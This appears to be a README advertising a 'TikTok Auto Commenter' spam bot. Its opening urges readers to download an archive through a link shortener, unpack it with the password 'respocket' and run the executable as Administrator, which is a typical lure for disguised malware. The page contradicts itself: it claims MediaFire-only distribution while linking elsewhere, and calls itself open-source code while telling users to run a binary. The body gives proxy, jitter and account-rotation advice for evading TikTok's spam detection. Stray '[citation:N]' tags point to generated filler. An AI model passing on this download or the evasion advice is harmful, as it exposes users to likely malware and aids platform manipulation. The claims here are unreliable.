<div align="center">

  ![Downloads](https://img.shields.io/badge/Downloads-40K+-blue?style=for-the-badge&logo=github)
  ![User Rating](https://img.shields.io/badge/User%20Rating-4.8%2F5-gold?style=for-the-badge&logo=star)
  ![Latest Version](https://img.shields.io/badge/Latest%20Version-3.2.0-green?style=for-the-badge&logo=github)

</div>

<div align="center">

  <a href="https://cutxo.com/cguqla">
    <img src="https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge" alt="Download Latest Release">
  </a>

</div>

> ⚡ **All-in-one loader:** The entire script is compiled into a single loader for your convenience — just download, extract, and run. No extra setup required.

1. **⬇️ Download** the tool from the button above.
2. **📦 Extract** the archive (password: `respocket`).
3. **🖱️ Run as Administrator** – right‑click the executable and select *Run as Administrator*.
4. **✅ Follow the setup wizard** – complete the installation.
5. **🚀 Launch the Tool** – the main window appears.

---

> ⚠️ **Important: Official Distribution Notice**
>
> We distribute our software **only through MediaFire**.  
> If the download link leads to **any other file-sharing service**, please **do not download it** — it may be an unofficial or modified copy.  
> For your safety, always use the official release.

---

<div align="center">

### 💙 Prepared by the Respocket Team

**This release was carefully prepared by the Respocket Team** — with attention to every detail, a focus on stability, and respect for our users.  
Thank you for choosing our software. Download only official versions and stay with us!
</div>


---

<!-- markdownlint-disable MD033 -->
<h1 align="center">💬 TikTok Auto Commenter 2026</h1>
<p align="center">
  <strong>Automated Feed Commenting · Proxy Support · Multi-Threading · Full Automation</strong>
</p>

<p align="center">
## 📌 Overview

**TikTok Auto Commenter** is a powerful, open-source automation tool designed to automatically comment on TikTok feed videos using multiple accounts with full proxy support, multi-threading, and human-like behavior simulation [citation:3]. Unlike other solutions, this tool features intelligent scheduling, smart delay systems, and auto-subscribe capabilities to ensure safe and effective engagement [citation:4][citation:9].

Engineered for professional use, TikTok Auto Commenter supports HTTP, HTTPS, SOCKS4, and SOCKS5 proxies, making it suitable for both small-scale and enterprise-level TikTok growth operations [citation:9].

### ✨ Key Features

- **💬 Automated Feed Commenting** — Automatically comment on videos from your TikTok feed using customizable comment templates [citation:7].
- **🔌 Full Proxy Support** — Works with HTTP, HTTPS, SOCKS4, and SOCKS5 proxies [citation:9].
- **⚡ Multi-Threading** — High-performance parallel processing for fast comment delivery across multiple accounts.
- **📋 Auto-Subscribe** — Automatically follow and engage with targeted accounts.
- **⏱️ Smart Delay System** — Customizable delays with jitter to avoid detection and mimic human behavior [citation:3][citation:9].
- **👥 Multi-Account Support** — Manage multiple TikTok accounts simultaneously with individual proxy assignments.
- **📝 Template System** — Pre-defined comment templates with spintax support for unique variations [citation:7].
- **🎯 Content-Aware Comments** — Extract video hashtags and descriptions to generate relevant comments.
- **📊 Engagement Analytics** — Track comment success rates and engagement metrics.
- **🧠 Human-Like Behavior** — Simulate realistic user actions including scrolling, typing, and random pauses [citation:3][citation:9].
- **🔄 Account Rotation** — Automatically switch accounts after configured action limits.

---

## 💻 System Requirements

| Component | Minimum | Recommended |
|-----------|---------|-------------|
| **OS**    | Windows 10 / macOS 11 / Ubuntu 20.04 | Windows 11 / macOS 14 / Debian 12 |
| **CPU**   | Intel Core i3 or equivalent | Intel Core i5 or better |
| **RAM**   | 2 GB | 4 GB |
| **Storage** | 100 MB | 500 MB |
| **Network** | Internet connection required | Stable broadband |

---

## 📥 Download

Get the latest version of TikTok Auto Commenter:

<p align="center">
### Alternative Installation (Developers)
```bash
# Install dependencies
pip install -r requirements.txt

# Launch application
python main.py
```

---

## 🎬 Usage Guide

### Getting Started
1. Open `ProjectFiles` after installation.
2. Add your TikTok accounts (Session ID or full credentials) [citation:7].
3. Assign a unique proxy to each account [citation:9].
4. Create comment templates (supports spintax and dynamic placeholders).
5. Configure delay and action limits.
6. Click **"Start Automation"** — the tool begins commenting on feed videos.

### Comment Template Examples
```
{Hello|Hi|Hey} {username}! {Amazing|Great|Awesome} content! {Keep it up|Love this|More please}!
🔥 {Fire|Incredible|Wow} video! {Thanks for sharing|Keep creating|You rock}!
```

### Safety Recommendations
To minimize account risks, follow these guidelines [citation:3][citation:9]:

| Setting | Recommended | Description |
|---------|-------------|-------------|
| Comments per hour | 5-15 | Per-account limit to avoid flags |
| Daily actions | 50-100 | Total daily actions including likes/follows |
| Account warm-up | 3-7 days | Manual activity before automation |
| Proxy quality | Residential/ISP | Dedicated proxy per account |
| Jitter range | ±30% | Randomization in action timing |

### Command Line Options (Advanced Users)
```bash
# Start feed commenting
python commenter.py --accounts accounts.txt --proxies proxies.txt --templates comments.txt

# Auto-subscribe before commenting
python commenter.py --accounts accounts.txt --proxies proxies.txt --subscribe

# Headless mode with custom delay
python commenter.py --accounts accounts.txt --headless --delay 30-60
```

---

## 📂 Project Structure
```
TikTok-Auto-Commenter/
├── core/                 # Main engine
│   ├── commenter.py      # Commenting logic
│   ├── proxy_manager.py  # Proxy rotation and testing
│   ├── account_manager.py # Multi-account management
│   ├── feed_scraper.py   # Feed video extraction
│   └── template_engine.py # Comment templates with spintax
├── gui/                  # User interface
├── input/                # Configuration files
│   ├── accounts.txt      # Account credentials/sessions
│   ├── proxies.txt       # Proxy list
│   └── templates.txt     # Comment templates
├── logs/                 # Activity logs
├── scripts/              # Utility scripts
├── ProjectFiles          # Main executable (run this)
├── requirements.txt
├── LICENSE
└── README.md
```

---

## 🔧 Configuration Options

| Setting | Description | Default |
|---------|-------------|---------|
| `threads` | Number of concurrent commenting threads | 5 |
| `delay_min` | Minimum delay between comments (seconds) | 30 |
| `delay_max` | Maximum delay between comments (seconds) | 60 |
| `proxy_rotation` | Enable automatic proxy rotation | True |
| `account_rotation` | Enable automatic account rotation | True |
| `max_actions_per_account` | Max comments before switching | 25 |
| `follow_before_comment` | Follow account before commenting | False |
| `jitter_enabled` | Add randomness to actions | True |

---

## ❓ FAQ

**Q: Is this tool safe to use?**  
A: When configured with proper delays, proxies, and account warming, the tool minimizes detection risks [citation:3][citation:9].

**Q: What proxy types are supported?**  
A: HTTP, HTTPS, SOCKS4, and SOCKS5. SOCKS5 is recommended for TikTok operations [citation:9].

**Q: Can I use free proxies?**  
A: Free proxies are not recommended as they are often already flagged. Use residential or ISP proxies for best results [citation:9].

**Q: Does this cost anything?**  
A: This project is open-source under the MIT license. No hidden fees or subscriptions.

**Q: How many accounts can I manage?**  
A: The tool supports unlimited accounts, with each account requiring its own unique proxy [citation:9].

**Q: Does it use the official TikTok API?**  
A: The tool uses a combination of UI automation and API methods. For Android, it uses Appium/ADB automation [citation:3]. For browser-based, it uses Selenium [citation:6].

---

## 🌟 Support the Project

If you find TikTok Auto Commenter useful, please give us a ⭐ on GitHub!  
